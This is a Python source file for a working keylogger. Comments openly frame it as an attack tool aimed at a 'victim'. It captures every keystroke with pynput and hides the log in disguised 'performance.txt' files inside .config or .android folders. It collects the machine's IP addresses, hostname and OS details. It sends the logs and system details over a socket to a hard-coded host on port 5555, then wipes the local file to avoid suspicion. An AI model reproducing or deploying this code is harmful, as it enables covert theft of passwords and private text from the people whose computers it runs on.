import os
import platform;
import sys;
import socket;
from typing import *;
from requests import get;
from pynput.keyboard import Listener, Key

HOST: str = "10.0.0.16" # Hackuntu or Laptop for testing
PORT: int = 5555  # Will use this port for now, but could change it later
FILEPATH = ""
KEYS: List[Key] = []
COUNT: int = 0

def main():
    global FILEPATH;
    filepath: str = ""
    filepath = makePath()  # Create the path for the files to be stored
    FILEPATH = filepath
    victimInfo(filepath)  # Get the information of a victim and send it to me

    # Keylogger process runs
    with Listener(on_press=keyPress) as listener:
        listener.join()

def keyPress(key: Key) -> None:
    """
    Function to deal with keys being pressed when listener captures them
    """
    global KEYS, COUNT

    KEYS.append(key)
    COUNT += 1
    if COUNT >= 1: # if we have more than one key in our KEYS array then we write
        COUNT = 0 # reset count
        writeKey(KEYS, FILEPATH);
        KEYS = [] # reset KEYS array

def writeKey(keys: List[Key], filepath: str) -> None:
    """ 
    This will write keys to a file that is created
    but checking what OS we are on to create the file accordingly
    the plan is to create the file in a folder that a normal
    person will not check in
    """
    fileSize: int = 0;

    with open(filepath, "a") as keyFile:
        for key in keys:
            k = str(key).replace("'", "") # Replace quotes that come with keys
            if k.find("space") > 0: # Check if it is a space character
                keyFile.write("\n")
            if k.find("Key") == -1: # Check if it is a special key
                keyFile.write(k)
        fileSize = os.path.getsize(filepath) # Check the size of the file and when it gets to a certain size send file
        if (fileSize % 1000 == 0): # Check size to send email and wipe the current text file to not arise suspiscion
            clear(filepath)

def victimInfo(filepath: str) -> None:
    """
    Function to get the information of the victims computer
    and add it to a text file
    """
    if (searchFile(filepath.replace("performance.txt", ""), "info.txt") is not None): # Check if we already got the info of this victim
        return;
    newFilePath: str = filepath.replace("performance.txt", "info.txt")

    with open(newFilePath, "w") as infoFile:
        hostname: str = socket.gethostname()
        privateIP: str = socket.gethostbyname(hostname)
        try:
            publicIp: str = get("https://api.ipify.org").text
            infoFile.write("Public IP: " + publicIp + "\n")
        except Exception:
            infoFile.write("Unable to get Public IP\n")
        infoFile.write("Processor: " + platform.processor() + "\n")
        infoFile.write("System: " + platform.system() + " " + platform.version() + "\n")
        infoFile.write("Machine: " + platform.machine() + "\n")
        infoFile.write("Hostname: " + hostname + "\n")
        infoFile.write("Private IP: " + privateIP)
    sendFile(HOST, PORT, newFilePath)

def makePath() -> str:
    homepath: str = ""
    filepath: str = ""
    username: str = ""

    if os.name == "posix": # We are on a Linux
        homepath = "/home/"  # Set Home Path that is usual for Linux
        try:
            username = os.getlogin() + "/" # We will try to get their username
            filepath = searchFile(homepath + username, ".config") # We will look for .config folder
            if filepath is None: # .config was not found then we will make one
                try:
                    os.makedirs(homepath + username + ".config")
                    filepath = homepath + username + ".config/performance.txt" # Set file path to in the directory that we created
                except OSError:
                    sys.exit(1)
            else:
                filepath = filepath + "/performance.txt"
                return filepath
        except Exception:
            sys.exit(1)
    elif os.name == "nt":
        homepath = "C:\\Users\\" # Set home path that is usual for Windows systems
        try:
            username = os.getlogin() + "\\" # We will attempt to get the username for the home directory
            filepath = searchFile(homepath + username, ".android") # We are looking for the .android folder to store our info
            if filepath is None: # .android folder was not found so we will create it
                try:
                    os.makedirs(homepath + username + ".android")
                    filepath = homepath + username + ".android\\performance.txt" # Set file path to the directory in Local
                except OSError:
                    sys.exit(1)
            else:
                filepath = filepath + "\\performance.txt"
            return filepath
        except Exception:
            sys.exit(1)

def searchFile(start: str, target: str) -> Union[str, None]:
    """
    Function to search if a file or folder exists in order to check
    for the existence of the .config file to store keylogs
    """
    for root, dir, file in os.walk(start):  # Search every directory and file
        if target in file or target in dir:
            return os.path.join(root, target)
    return None

def sendFile(host: str, port: int, filepath: str) -> None:
    """
    This function will send a file to my computer using my IP
    and using port 5555 which is one that is not used and can be
    less suspicious
    """
    # Trying to send the file
    try:
        with socket.create_connection((host, port)) as clientSocket:  # Try to connect to the host
            print(f"Connected to {host}:{port}")  # Debug print for now to ensure that it connected
            # Send the file data to the computer
            with open(filepath, 'rb') as newFile:
                while True:
                    data = newFile.read(1024)
                    if not data:
                        break
                    clientSocket.sendall(data)  # Send all the data to the server
            print("File sent successfully!")  # Debug print for now to ensure that it sent
    except Exception:
            return

def clear(filepath: str):
    """
    Function sends the text file as an email to personal email
    and then clears out the current keys in the text file to not arise suspicion
    """
    sendFile(HOST, PORT, filepath)
    with open(filepath, "w") as keyFile:
        keyFile.truncate(0)

if __name__ == "__main__":
    main()